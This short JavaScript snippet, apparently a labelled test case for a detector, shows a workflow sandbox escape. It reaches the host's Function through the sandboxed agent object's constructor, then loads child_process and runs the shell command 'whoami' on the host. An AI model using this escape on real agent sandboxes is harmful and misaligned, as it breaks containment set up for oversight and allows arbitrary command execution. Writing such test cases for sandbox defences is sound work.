// 正例：workflow 沙箱逃逸（agent.constructor → 宿主 Function → process）
const p = agent.constructor("return process")().getBuiltinModule('child_process').spawnSync('whoami')
phase('done')
